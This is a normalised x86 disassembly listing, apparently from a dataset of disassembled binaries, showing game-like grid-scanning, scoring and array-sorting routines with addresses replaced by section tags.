mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
cmp [ ecx ] 0x20
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov ecx [ ebp - 0x8 ]
jmp r-xdata
test edx edx
jne r-xdata
test edx edx
jne r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
add ecx edi
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov edx 0x1
mov [ rw-data ] edx
inc edi
add ecx 0x4
mov [ rw-data ] edi
mov [ ebp - 0x8 ] ecx
cmp edi 0xa
jle r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
xor edx edx
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edi
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edi
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
cmp [ ecx ] 0x20
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
dec edx
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
mov ecx [ ebp - 0xc ]
jmp r-xdata
mov edx [ rw-data ]
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
dec edx
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
mov ecx [ ebp - 0xc ]
mov edx [ rw-data ]
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] 0x0
mov ecx [ eax ]
mov edx [ rw-data ]
dec edx
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] 0x10
mov ecx [ eax ]
mov edx [ rw-data ]
dec edx
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ ebp - 0x8 ]
mov [ esi + ecx * 8 + 0x4 ] edx
mov ecx [ ebp - 0xc ]
jmp r-xdata
mov edx [ rw-data ]
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
mov [ esi + ecx * 8 + 0x4 ] edx
mov ecx [ ebp - 0xc ]
jmp r-xdata
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + ecx * 4 - 0x34 ] 0x20
jne r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + ecx * 4 - 0x34 ] 0x20
jne r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
cmp edx 0x1
jl r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
lea ecx [ eax + ecx * 4 ]
mov eax [ ebp + 0x1c ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov edi [ ebp + 0x10 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
inc edx
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
mov edx [ rw-data ]
cmp edx 0x1
jl r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
lea ecx [ eax + ecx * 4 ]
mov eax [ ebp + 0x1c ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov edi [ ebp + 0x10 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
inc edx
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
mov edx [ rw-data ]
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
xor edx edx
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edi
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0xc ]
jmp r-xdata
mov ecx [ ebp - 0x8 ]
dec edi
sub ecx 0x4
mov [ rw-data ] edi
mov [ ebp - 0x8 ] ecx
cmp edi 0x1
jge r-xdata
cmp [ ecx ] 0x20
jne r-xdata
jmp r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
xor edx edx
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edi
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0xc ]
jmp r-xdata
mov ecx [ ebp - 0x8 ]
dec edi
sub ecx 0x4
mov [ rw-data ] edi
mov [ ebp - 0x8 ] ecx
cmp edi 0x1
jge r-xdata
cmp [ ecx ] 0x20
jne r-xdata
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
add ecx edi
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov edx 0x1
mov [ rw-data ] edx
dec edi
sub ecx 0x4
mov [ rw-data ] edi
mov [ ebp - 0x8 ] ecx
cmp edi 0x1
jge r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
xor edx edx
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edi
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
xor edx edx
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edi
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
cmp [ ecx ] 0x20
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
add ecx edi
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov edx 0x1
mov [ rw-data ] edx
dec edi
sub ecx 0x4
mov [ rw-data ] edi
mov [ ebp - 0x8 ] ecx
cmp edi 0x1
jge r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
xor edx edx
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edi
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
xor edx edx
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edi
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
cmp [ ecx ] 0x20
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov edi [ ebp + 0x10 ]
inc [ eax ]
xor edx edx
cmp [ edi ] edx
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ ebp - 0x8 ]
mov [ esi + ecx * 8 + 0x4 ] edx
mov ecx [ ebp - 0xc ]
jmp r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ ebp - 0x8 ]
mov [ esi + ecx * 8 + 0x4 ] edx
mov ecx [ ebp - 0xc ]
jmp r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov edi [ ebp + 0x10 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
inc edx
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov edi [ ebp + 0x10 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
dec edx
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
mov edx [ rw-data ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov edi [ ebp + 0x10 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
inc edx
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov edi [ ebp + 0x10 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
dec edx
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
mov edx [ rw-data ]
mov ecx [ ecx ]
sete dl
cmp ecx [ edx * 4 + r--data ]
je r-xdata
cmp [ ecx ] 0x20
jne r-xdata
jmp r-xdata
cmp [ ecx ] 0x20
jne r-xdata
jmp r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
xor edx edx
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edi
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0xc ]
jmp r-xdata
cmp [ ecx ] 0x20
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
xor edx edx
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edi
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0xc ]
jmp r-xdata
cmp [ ecx ] 0x20
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
dec edx
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
mov ecx [ ebp - 0xc ]
jmp r-xdata
mov edx [ rw-data ]
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
dec edx
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
mov ecx [ ebp - 0xc ]
jmp r-xdata
mov edx [ rw-data ]
sub_40b870
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push 0x1000
push 0x0
push rw-data
call sub_40de60
push 0x80
push 0x0
push rw-data
call sub_40de60
push 0x80
push 0x0
push rw-data
call sub_40de60
push 0x80
push 0x0
push rw-data
call sub_40de60
push 0x80
push 0x0
push rw-data
call sub_40de60
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0xc ]
push rw-data
push rw-data
push esi
push ebx
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
call sub_407800
mov ecx [ esi ]
add esp 0x50
mov edx [ ecx * 4 + r--data ]
mov esi [ ecx * 4 + r--data ]
cmp edx esi
jg r-xdata
push edi
mov edi ebx
xor esi esi
nop [ eax + eax ] ax
xor eax eax
test ecx ecx
mov ecx edx
sete al
shl ecx 0x5
mov eax [ eax * 4 + r--data ]
add eax ecx
lea eax [ eax * 4 + rw-data ]
add esi 0x4
add edi 0x8
cmp esi 0x80
jl r-xdata
mov eax [ esi + r--data ]
lea ecx [ eax + eax * 2 ]
mov eax [ edi + 0x4 ]
lea eax [ eax + ecx * 4 ]
imul eax eax 0xb
add eax [ edi ]
mov eax [ eax * 4 + r--data ]
mov eax [ eax * 4 + r--data ]
add eax ebx
mov [ esi + rw-data ] eax
pop esi
mov eax 0x25e4
pop ebx
mov esp ebp
pop ebp
retn
inc edx
sub eax 0xffffff80
cmp edx esi
jle r-xdata
mov edx [ esi + r--data ]
mov ebx [ edx * 4 + r--data ]
imul ebx [ esi + rw-data ]
add ebx [ edx * 4 + r--data ]
mov [ esi + rw-data ] ebx
cmp edx 0x6
jne r-xdata
mov esi rw-data
xor edi edi
cmp [ eax ] 0x0
jne r-xdata
add ecx 0x4
add esi 0x4
cmp ecx 0x80
jl r-xdata
mov eax [ edi + r--data ]
cmp eax [ ecx + r--data ]
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
add edi 0x4
cmp esi rw-data
jl r-xdata
mov eax [ ecx + rw-data ]
mov edx eax
shl edx 0x4
sub edx eax
mov eax 0x51eb851f
add edx edx
imul edx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
add [ edi + rw-data ] eax
dec [ ecx + rw-data ]
inc [ ecx + rw-data ]
cmp [ ecx + rw-data ] 0x0
jne r-xdata
xor ecx ecx
mov eax [ ebp + 0x10 ]
mov ebx [ eax ]
mov esi [ ebx * 4 + r--data ]
mov ecx esi
mov edx [ ebx * 4 + r--data ]
mov [ ebp - 0x8 ] esi
cmp ecx edx
jg r-xdata
imul edx [ ecx + rw-data ] 0x19
mov eax 0x51eb851f
mov [ ecx + rw-data ] 0x1
imul edx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
add [ edi + rw-data ] eax
jmp r-xdata
xor eax eax
mov [ rw-data ] 0x0
test ebx ebx
mov [ rw-data ] 0x20
sete al
mov edx [ eax * 4 + r--data ]
mov ecx edx
mov ebx [ eax * 4 + r--data ]
cmp ecx ebx
jg r-xdata
mov esi [ ebp - 0x4 ]
mov edi [ ebp + 0xc ]
nop [ eax ] eax
xor ecx ecx
cmp edx ebx
jg r-xdata
mov eax ecx
shl eax 0x5
add eax esi
lea edi [ eax * 4 + rw-data ]
mov eax [ ebp + 0xc ]
inc ecx
cmp ecx edx
jle r-xdata
mov eax [ ecx * 4 + rw-data ]
add eax [ ecx * 4 + rw-data ]
add esi eax
mov eax [ ebp - 0x4 ]
pop edi
pop esi
add eax ecx
pop ebx
mov esp ebp
pop ebp
retn
nop
cmp [ edi ] 0x0
jne r-xdata
mov eax [ ecx * 4 + rw-data ]
add eax [ ecx * 4 + rw-data ]
sub [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
cmp [ edi + ecx * 8 ] 0x0
je r-xdata
mov [ ebp - 0x4 ] esi
mov esi [ ebp - 0x8 ]
inc edx
cmp edx ebx
jle r-xdata
mov eax [ edx * 4 + rw-data ]
cmp eax ecx
cmovg ecx eax
cmp [ ecx * 4 + rw-data ] 0x0
mov [ rw-data ] 0x1
mov [ rw-data ] ecx
jl r-xdata
inc ecx
sub edi 0xffffff80
cmp ecx ebx
jle r-xdata
cmp [ edx * 4 + rw-data ] 0x0
jge r-xdata
mov edi [ ebp + 0x10 ]
xor ecx ecx
mov eax [ edi ]
mov edx [ eax * 4 + r--data ]
cmp esi edx
jg r-xdata
cmp [ eax + ecx * 8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
sub eax ecx
pop ebx
mov esp ebp
pop ebp
retn
cmp [ esi * 4 + rw-data ] 0x0
jge r-xdata
inc esi
cmp esi edx
jle r-xdata
mov eax [ esi * 4 + rw-data ]
cmp eax ecx
cmovg ecx eax
sub_40bb80
push ebp
mov ebp esp
mov edx [ ebp + 0x18 ]
sub esp 0x1c
mov eax edx
push esi
mov esi [ ebp + 0x14 ]
sub eax esi
test eax eax
jle r-xdata
pop esi
mov esp ebp
pop ebp
retn
push ebx
mov ebx [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x10 ]
lea eax [ esi + edx ]
cdq
sub eax edx
mov edx [ ebp + 0xc ]
sar eax 0x1
mov esi [ edx + eax * 4 ]
lea edx [ edx + eax * 4 ]
mov edi [ ebx + eax * 4 ]
lea ecx [ ebx + eax * 4 ]
mov [ ebp - 0x10 ] esi
mov esi [ ebp + 0x10 ]
lea esi [ esi + eax * 8 ]
mov [ ebp - 0x4 ] edi
mov eax [ esi ]
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x14 ]
lea eax [ ebx + eax * 4 ]
mov [ ebp - 0x8 ] eax
mov eax [ eax ]
mov [ ecx ] eax
mov eax [ ebp - 0x8 ]
mov [ eax ] edi
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
mov ecx [ edx ]
lea eax [ eax + edi * 4 ]
mov [ ebp - 0xc ] eax
mov eax [ eax ]
mov [ edx ] eax
mov eax [ ebp - 0xc ]
mov [ eax ] ecx
mov eax [ ebp + 0x10 ]
mov ecx [ esi ]
lea edi [ eax + edi * 8 ]
mov eax [ edi ]
mov edx [ esi + 0x4 ]
mov [ esi ] eax
mov eax [ edi + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebp + 0x18 ]
mov esi eax
mov [ ebp - 0x14 ] edi
mov [ edi ] ecx
mov [ edi + 0x4 ] edx
mov edi [ ebp + 0x14 ]
lea eax [ ebx + eax * 4 ]
inc edi
mov eax [ ebx + edx * 4 ]
cmp eax [ ebx + esi * 4 ]
jg r-xdata
cmp ecx [ eax ]
jle r-xdata
nop [ eax ] eax
mov ecx eax
mov eax [ ebx + esi * 4 ]
mov [ ebx + edx * 4 ] eax
mov edx [ ebp + 0xc ]
mov [ ebx + esi * 4 ] ecx
mov ebx [ ebp + 0x18 ]
mov eax [ edx + esi * 4 ]
mov ecx [ edx + ebx * 4 ]
mov [ edx + ebx * 4 ] eax
mov [ edx + esi * 4 ] ecx
mov eax [ edi + esi * 8 ]
mov ecx [ edi + ebx * 8 ]
mov edx [ edi + ebx * 8 + 0x4 ]
mov [ edi + ebx * 8 ] eax
mov eax [ edi + esi * 8 + 0x4 ]
mov [ edi + ebx * 8 + 0x4 ] eax
mov [ edi + esi * 8 ] ecx
mov [ edi + esi * 8 + 0x4 ] edx
cmp edi esi
jge r-xdata
nop
inc edi
cmp edi esi
jle r-xdata
mov eax [ ebx + esi * 4 ]
mov edx [ ebp - 0x8 ]
mov edi [ ebp + 0x10 ]
mov [ edx ] eax
mov edx [ ebp - 0xc ]
mov [ ebx + esi * 4 ] ecx
mov ecx [ ebp + 0xc ]
mov eax [ ecx + esi * 4 ]
mov [ edx ] eax
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
mov [ ecx + esi * 4 ] eax
mov eax [ edi + esi * 8 ]
mov [ edx ] eax
mov eax [ edi + esi * 8 + 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp + 0x14 ]
mov [ edi + esi * 8 ] eax
mov eax [ ebp - 0x1c ]
mov [ edi + esi * 8 + 0x4 ] eax
lea eax [ esi - 0x1 ]
cmp edx eax
jge r-xdata
mov ecx [ ebx + edi * 4 ]
lea edx [ ebx + esi * 4 ]
mov eax [ edx ]
mov [ ebx + edi * 4 ] eax
mov ebx [ ebp + 0x10 ]
mov [ edx ] ecx
mov edx [ ebp + 0xc ]
mov ecx [ edx + edi * 4 ]
mov eax [ edx + esi * 4 ]
mov [ edx + edi * 4 ] eax
mov eax [ ebp + 0x10 ]
mov [ edx + esi * 4 ] ecx
mov ecx [ eax + edi * 8 ]
mov edx [ eax + edi * 8 + 0x4 ]
mov eax [ eax + esi * 8 ]
mov [ ebx + edi * 8 ] eax
mov eax ebx
mov eax [ eax + esi * 8 + 0x4 ]
mov [ ebx + edi * 8 + 0x4 ] eax
mov eax ebx
mov ebx [ ebp + 0x8 ]
mov [ eax + esi * 8 ] ecx
mov [ eax + esi * 8 + 0x4 ] edx
lea eax [ ebx + esi * 4 ]
jmp r-xdata
dec esi
cmp ecx [ ebx + esi * 4 ]
jg r-xdata
cmp [ ebx + edi * 4 ] ecx
jl r-xdata
mov edx [ ebp + 0x18 ]
inc esi
mov [ ebp + 0x14 ] esi
cmp esi edx
jge r-xdata
push eax
push edx
push edi
push ecx
push ebx
call sub_40bb80
add esp 0x14
mov ecx [ ebp - 0x4 ]
cmp edi esi
jg r-xdata
pop edi
pop ebx
mov eax edx
sub eax esi
test eax eax
jg r-xdata
cmp eax 0x1
jne r-xdata
pop edi
pop ebx
pop esi
mov esp ebp
pop ebp
retn
sub_40bd60
push ebp
mov ebp esp
sub esp 0x810
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x1c ]
mov edx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x14 ]
push edi
mov edi [ ebp + 0xc ]
mov [ ebp - 0x7e4 ] ebx
mov [ ebp - 0x804 ] eax
lea eax [ eax + eax * 2 ]
lea eax [ ecx + eax * 4 ]
mov [ ebp - 0x7e8 ] esi
mov ebx [ edi + esi * 8 ]
mov [ ebp - 0x808 ] ebx
mov ebx [ edi + esi * 8 + 0x4 ]
lea esi [ edx + eax * 4 ]
mov [ ebp - 0x7ec ] ebx
xor eax eax
mov ebx [ ebp - 0x7e4 ]
mov [ ebp - 0x7fc ] ecx
mov ecx [ esi ]
mov [ ebp - 0x800 ] edx
cmp [ ebx ] eax
mov [ ebp - 0x7e0 ] edi
sete al
mov [ ebp - 0x7f8 ] 0x20
mov [ ebp - 0x7f0 ] esi
cmp [ ecx * 4 + r--data ] eax
jne r-xdata
mov eax [ ebp - 0x7e8 ]
mov ecx [ ebp + 0x24 ]
mov [ esi ] eax
dec ecx
mov eax [ ebp - 0x808 ]
mov esi [ ebp - 0x7ec ]
